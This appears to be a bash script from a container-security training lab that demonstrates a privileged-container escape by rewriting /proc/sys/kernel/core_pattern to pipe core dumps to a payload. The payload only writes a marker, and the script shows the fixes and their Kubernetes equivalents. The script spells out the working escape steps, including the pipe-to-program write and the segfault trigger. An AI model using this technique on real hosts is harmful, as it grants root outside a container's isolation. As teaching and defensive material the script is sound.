#!/usr/bin/env bash
# act3/01-core_pattern.sh — escape 1 of 4: core_pattern.
# Terminal: lab (B) + host (A). Uses sudo. DISPOSABLE LAB VM ONLY.
#
# Three-beat rhythm (all act3 scripts):
#   BEAT 1 PREREQ: what does this technique need? (verify, then predict)
#   BEAT 2 ESCAPE: fire it, watch the marker appear on the HOST side
#   BEAT 3 REMEDIATE: apply the fix, re-fire, watch it fail — and say WHY
#
# The privileged-jail simulation: unshare -m as REAL root with the HOST's
# rw /proc — exactly the powers 'privileged: true' grants a pod.
#
# CLEANUP: trap restores core_pattern to the value saved at script start,
# removes payload and marker. The remediation binds die with the jail ns.

set -euo pipefail

hr()   { printf '\n\033[1m%s\033[0m\n' "----------------------------------------------------------------"; }
hdr()  { printf '\n\033[1m== %s ==\033[0m\n' "$*"; }
say()  { printf '  %s\n' "$*"; }
pause(){ printf '\n  \033[2m[press Enter for the next beat]\033[0m'; read -r; }
JAIL_PROMPT='\[\033[35m\][PRIVILEGED-JAIL]\[\033[0m\] \$ '

PAYLOAD_DIR=/tmp/lab-escape
MARKER=$PAYLOAD_DIR/marker
KNOB=/proc/sys/kernel/core_pattern

[[ $EUID -eq 0 ]] || exec sudo "$0" "$@"

ORIG=$(cat "$KNOB")
cleanup() {
    echo "$ORIG" > "$KNOB" 2>/dev/null && say "cleanup: core_pattern restored to '$ORIG'"
    rm -rf "$PAYLOAD_DIR"
    return 0
}
trap cleanup EXIT INT TERM

# --------------------------------------------------------------------------
hdr "BEAT 1 — PREREQ: can this cage write the knob?"
hr
say "You are about to be dropped into a PRIVILEGED jail (mount ns only;"
say "real root; host /proc rw). Run inside:"
say "    id                          (uid 0 — REAL, not userns-fake)"
say "    capsh --print | head -3     (full set — including CAP_SYS_ADMIN)"
say "    cat $KNOB     (current value)"
say "    test -w $KNOB && echo WRITABLE || echo NOT WRITABLE"
say ""
say "PREDICT before beat 2: which act2 recipe steps does this jail satisfy?"
say "Type 'exit' to come back."
hr
env PS1="$JAIL_PROMPT" unshare -m bash
say "debrief: writable = the prereq column of your act2/01 table, satisfied."
pause

# --------------------------------------------------------------------------
hdr "BEAT 2 — ESCAPE: point the kernel's core-dump handler at your file"
hr
mkdir -p "$PAYLOAD_DIR"
say "Build the payload (script does it — this is act2's step 1):"
cat > "$PAYLOAD_DIR/payload.sh" <<'EOF'
#!/bin/sh
echo "core_pattern ESCAPE: ran as $(id -un) pid $$ on the host at $(date)" >> /tmp/lab-escape/marker
EOF
chmod +x "$PAYLOAD_DIR/payload.sh"
say "    payload: $PAYLOAD_DIR/payload.sh  (bridge: shared /tmp — trivially"
say "    host-path-addressable. In a real container: upperdir or hostPath.)"
say ""
say "Back into the jail. Run inside:"
say "    echo '|/tmp/lab-escape/payload.sh %P' > $KNOB"
say "    cat $KNOB       (the '|' is the whole trick: pipe the dump to a PROGRAM)"
say "    ulimit -c unlimited"
say "    bash -c 'kill -SEGV \$\$'         (trigger: make a core dump happen)"
say "Then in Terminal A (host):"
say "    cat /tmp/lab-escape/marker      (your payload ran. On the host.)"
say "    ls -la /tmp/lab-escape/marker   (owner: root — REAL root)"
say "Type 'exit' to come back."
hr
env PS1="$JAIL_PROMPT" unshare -m bash
if [[ -f "$MARKER" ]]; then
    say "ESCAPE CONFIRMED. What just happened, mechanically:"
    say "  1. A process dumped core INSIDE the cage"
    say "  2. The kernel read core_pattern and saw '|program'"
    say "  3. call_usermodehelper ran YOUR program — as real root, in the"
    say "     INIT mount namespace. The cage was never consulted."
else
    say "marker missing — the helper may have raced; check dmesg | tail"
fi
pause

# --------------------------------------------------------------------------
hdr "BEAT 3 — REMEDIATE: make the knob un-writable, then retry"
hr
say "Two flavors of the same fix — run both inside a fresh jail:"
say ""
say "Flavor 1 (what runc maskedPaths does — SILENT defense):"
say "    mount --bind /dev/null $KNOB"
say "    echo '|x' > $KNOB               (write 'succeeds'... into /dev/null)"
say "    cat $KNOB                       (UNCHANGED — the write went nowhere)"
say "    bash -c 'kill -SEGV \$\$'          (no escape: knob never changed)"
say ""
say "Flavor 2 (explicit):"
say "    mount -o remount,ro /proc/sys   (in this mount ns)"
say "    echo '|x' > $KNOB               (dies: read-only file system)"
say ""
say "Then check Terminal A: no new marker lines. The remediation works at"
say "the MOUNT level — no capabilities dropped, no seccomp needed: the knob"
say "is simply not THERE to write."
hr
env PS1="$JAIL_PROMPT" unshare -m bash
say "debrief + Kubernetes mapping:"
say "  containers.securityContext.privileged: false → no CAP_SYS_ADMIN (beat 1 dies)"
say "  maskedPaths: [/proc/sys/kernel/core_pattern] → flavor 1, by default in restricted PSS"
say "  /proc/sys mounted read-only → flavor 2"
say "  Any ONE of the three kills this escape. Defense in depth = redundancy."

# --------------------------------------------------------------------------
hdr "CHECK QUESTIONS (act3/01)"
cat <<'EOF'
  1. The escape ran 'as root on the host' — but which kernel function
     actually executed the payload? In whose mount namespace?
  2. Flavor 1's write SUCCEEDED and the escape still failed. Explain why
     'succeeded' and 'effective' are different things.
  3. Which Pod Security Admission level blocks this by default?
     (Check: does 'restricted' mask core_pattern?)

  Next: act3-escapes/02-uevent_helper.sh — same recipe, different trigger.
EOF
